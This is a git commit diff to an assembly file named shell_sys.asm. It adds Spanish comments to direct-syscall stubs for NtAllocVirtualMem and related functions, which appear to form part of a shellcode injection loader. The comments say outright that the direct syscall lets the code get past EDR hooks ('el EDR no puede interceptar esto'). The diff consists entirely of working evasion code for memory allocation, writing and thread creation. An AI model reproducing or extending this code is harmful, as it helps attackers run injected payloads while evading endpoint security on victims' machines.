0c51cdc7bc5fcd7bd271fce45eb0c08d88174a83
Ezequiel Litre <86501459+Segaotava@users.noreply.github.com>
2026-08-23 16:10:33 -0300

    Update shell_sys.asm

--- shell_sys.asm
+++ shell_sys.asm
@@ -3,12 +3,18 @@ global NtAllocVirtualMem
 global NtProtectVirtualMem
 global NtWriteVirtualMem
 global NtCreateThreadEx
-extern g_ssn
+extern g_ssn        ; variable global definida en el .cpp
 
 NtAllocVirtualMem:
-    mov r10, rcx
-    movzx eax, word [rel g_ssn]
-    syscall
+    mov r10, rcx                    ; Windows x64 calling convention:
+                                    ; el kernel espera el primer argumento en r10
+                                    ; no en rcx (que reserva Windows internamente)
+    movzx eax, word [rel g_ssn]     ; leer el SSN desde la variable global
+                                    ; movzx limpia los bits altos de eax
+                                    ; rel = RIP-relative, necesario en x64
+                                    ; para acceder a variables globales de C++
+    syscall                         ; saltar directo al kernel
+                                    ; el EDR no puede interceptar esto
     ret
 
 NtProtectVirtualMem:
